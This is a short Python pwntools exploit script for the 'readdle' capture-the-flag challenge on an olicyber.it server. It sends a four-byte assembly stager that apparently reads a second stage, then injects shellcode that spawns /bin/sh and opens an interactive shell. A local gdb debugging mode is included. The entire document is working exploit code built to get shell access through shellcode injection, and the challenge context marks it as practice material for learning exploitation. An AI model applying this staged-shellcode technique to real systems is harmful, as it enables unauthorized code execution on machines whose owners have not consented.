#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux', endian='little')
SHELLCODE = """
mov dh, 100
syscall
"""
shell = asm(SHELLCODE)
shellcode = asm(shellcraft.amd64.linux.sh())
assert len(shell) <= 4, len(shell)
if args.REMOTE:
    r = remote("readdle.challs.olicyber.it", 10018)
else:
    r = gdb.debug("./readdle", """
        b *main+260
        continue
    """)

r.recvuntil(b'): ')
r.send(shell)
r.sendline(b'A' * 4 + shellcode)
r.interactive()
